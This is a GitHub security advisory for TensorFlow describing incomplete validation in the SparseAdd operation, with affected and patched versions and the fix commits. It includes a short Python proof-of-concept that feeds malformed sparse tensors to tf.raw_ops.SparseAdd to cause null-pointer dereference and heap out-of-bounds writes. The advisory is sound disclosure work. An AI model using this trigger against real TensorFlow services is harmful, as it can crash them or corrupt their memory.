# Incomplete validation in `SparseAdd`

Critical

[mihaimaruseac](/mihaimaruseac)
published
GHSA-cjc7-49v2-jp64
May 13, 2021

## Package

pip

Incomplete validation in `SparseAdd`
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

Incomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:

```
import tensorflow as tf

a_indices = tf.zeros([10, 97], dtype=tf.int64)
a_values = tf.zeros([10], dtype=tf.int64)
a_shape = tf.zeros([0], dtype=tf.int64)

b_indices = tf.zeros([0, 0], dtype=tf.int64)
b_values = tf.zeros([0], dtype=tf.int64)
b_shape = tf.zeros([0], dtype=tf.int64)

thresh = 0

tf.raw_ops.SparseAdd(a_indices=a_indices,
                    a_values=a_values,
                    a_shape=a_shape,
                    b_indices=b_indices,
                    b_values=b_values,
                    b_shape=b_shape,
                    thresh=thresh)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.

### Patches

We have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit [41727ff06111117bdf86b37db198217fd7a143cc](https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
